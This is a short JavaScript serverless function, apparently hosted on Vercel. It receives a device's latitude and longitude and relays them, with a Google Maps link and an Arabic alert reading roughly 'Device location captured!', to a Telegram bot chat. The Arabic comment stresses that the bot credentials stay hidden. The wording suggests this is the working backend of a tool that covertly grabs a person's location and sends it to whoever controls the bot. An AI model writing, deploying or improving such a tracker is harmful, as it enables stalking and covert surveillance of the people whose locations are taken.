export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { lat, lon } = req.body;
    
    // سحب التوكن والآيدي من إعدادات Vercel السرية ولن يتم كشفها أبداً
    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;

    if (!botToken || !chatId) {
        return res.status(500).json({ error: 'Environment variables are missing' });
    }

    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
    const message = `🚨 **تم التقاط موقع الجهاز!**\n\n` +
                    `📍 **خط العرض:** \`${lat}\`\n` +
                    `📍 **خط الطول:** \`${lon}\`\n\n` +
                    `🗺️ **خرائط جوجل:**\n${mapUrl}`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        
        const data = await response.json();
        return res.status(200).json({ success: true, data });
    } catch (error) {
        return res.status(500).json({ error: error.message });
    }
}
